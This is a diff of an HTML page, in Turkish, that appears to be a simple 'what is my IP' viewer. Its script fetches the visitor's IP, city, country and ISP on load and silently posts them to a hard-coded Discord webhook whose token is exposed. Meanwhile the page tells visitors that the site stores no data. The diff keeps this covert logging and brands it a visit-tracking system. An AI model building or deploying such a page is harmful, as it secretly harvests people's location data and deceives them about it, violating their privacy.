@@ -23,27 +23,11 @@
             width:360px;
             box-shadow:0 0 25px rgba(0,0,0,.7);
         }
-        h2 {
-            margin-top:0;
-            text-align:center;
-        }
-        .row {
-            margin:10px 0;
-            font-size:14px;
-        }
-        .label {
-            color:#888;
-        }
-        .value {
-            color:#00ff88;
-            word-break:break-all;
-        }
-        .note {
-            margin-top:20px;
-            font-size:12px;
-            color:#777;
-            text-align:center;
-        }
+        h2 { margin-top:0; text-align:center; }
+        .row { margin:10px 0; font-size:14px; }
+        .label { color:#888; }
+        .value { color:#00ff88; word-break:break-all; }
+        .note { margin-top:20px; font-size:12px; color:#777; text-align:center; }
     </style>
 </head>
 <body>
@@ -53,29 +37,25 @@
         <div class="row"><span class="label">Şehir:</span> <span id="city" class="value">Yükleniyor...</span></div>
         <div class="row"><span class="label">Ülke:</span> <span id="country" class="value">Yükleniyor...</span></div>
         <div class="row"><span class="label">ISP:</span> <span id="isp" class="value">Yükleniyor...</span></div>
-        <div class="note">
-            Bu site hiçbir veri kaydetmez.<br>
-            Bilgiler yaklaşık olabilir.
-        </div>
+        <div class="note">Bu site hiçbir veri kaydetmez.<br>Bilgiler yaklaşık olabilir.</div>
     </div>
 
     <script>
-        // Webhook URL'sini buraya tanımlıyoruz.
+        // Webhook URL (URL'nin doğruluğunu tekrar kontrol etmeyi unutma!)
         const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-        // Discord'a veri gönderen fonksiyon
         async function sendToDiscord(data) {
             const payload = {
-                content: "Yeni bir ziyaretçi bağlandı!",
+                content: "🚀 **Yeni Ziyaretçi Giriş Yaptı!**",
                 embeds: [{
-                    title: "Ziyaretçi Bilgileri",
-                    color: 5814783, // Yeşil renk kodu
+                    title: "Ziyaretçi Detayları",
+                    color: 3066993, // Canlı yeşil
                     fields: [
-                        { name: "IP Adresi", value: `\`\`\`${data.ip}\`\`\``, inline: true },
-                        { name: "Şehir", value: `\`\`\`${data.city}\`\`\``, inline: true },
-                        { name: "Ülke", value: `\`\`\`${data.country}\`\`\``, inline: true },
-                        { name: "ISP", value: `\`\`\`${data.isp}\`\`\``, inline: false }
+                        { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
+                        { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country}\``, inline: true },
+                        { name: "📡 Servis Sağlayıcı (ISP)", value: `\`${data.isp}\``, inline: false }
                     ],
+                    footer: { text: "Ziyaret Takip Sistemi" },
                     timestamp: new Date().toISOString()
                 }]
             };
@@ -83,46 +63,54 @@
             try {
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                if (!response.ok) {
-                    console.error('Webhook gönderilemedi:', response.statusText);
+
+                if (response.ok) {
+                    console.log('✅ Webhook başarıyla gönderildi.');
+                } else {
+                    console.error('❌ Webhook hatası:', response.status);
                 }
             } catch (error) {
-                console.error('Webhook gönderilirken bir hata oluştu:', error);
+                console.error('❌ Gönderim sırasında bir hata oluştu:', error);
             }
         }
 
-        // IP bilgilerini çeken ve hem ekrana yazan hem de Discord'a gönderen ana kod
-        fetch("https://ipwho.is/")
-            .then(res => res.json())
-            .then(data => {
-                if (!data.success) throw "API error";
+        // IP Bilgilerini Getir
+        async function fetchIpInfo() {
+            try {
+                // Alternatif olarak 'https://ipapi.co/json/' da kullanılabilir
+                const response = await fetch("https://ipwho.is/");
+                const data = await response.json();
 
-                const userInfo = {
-                    ip: data.ip,
-                    city: data.city || "Bilinmiyor",
-                    country: data.country || "Bilinmiyor",
-                    isp: data.isp || "Bilinmiyor"
-                };
+                if (data && data.success) {
+                    const info = {
+                        ip: data.ip,
+                        city: data.city || "Bilinmiyor",
+                        country: data.country || "Bilinmiyor",
+                        isp: data.connection?.isp || data.isp || "Bilinmiyor"
+                    };
 
-                // Ekrandaki elemanları güncelle
-                document.getElementById("ip").textContent = userInfo.ip;
-                document.getElementById("city").textContent = userInfo.city;
-                document.getElementById("country").textContent = userInfo.country;
-                document.getElementById("isp").textContent = userInfo.isp;
+                    // Arayüzü Güncelle
+                    document.getElementById("ip").textContent = info.ip;
+                    document.getElementById("city").textContent = info.city;
+                    document.getElementById("country").textContent = info.country;
+                    document.getElementById("isp").textContent = info.isp;
 
-                // Bilgileri Discord'a gönder
-                sendToDiscord(userInfo);
-            })
-            .catch(() => {
-                document.querySelectorAll(".value").forEach(e => {
-                    e.textContent = "Alınamadı";
-                });
-            });
+                    // Discord'a Gönder
+                    await sendToDiscord(info);
+                } else {
+                    throw new Error("API verisi alınamadı.");
+                }
+            } catch (error) {
+                console.error("Bilgi çekme hatası:", error);
+                document.querySelectorAll(".value").forEach(e => e.textContent = "Hata!");
+            }
+        }
+
+        // Sayfa yüklendiğinde çalıştır
+        window.onload = fetchIpInfo;
     </script>
 </body>
 </html>
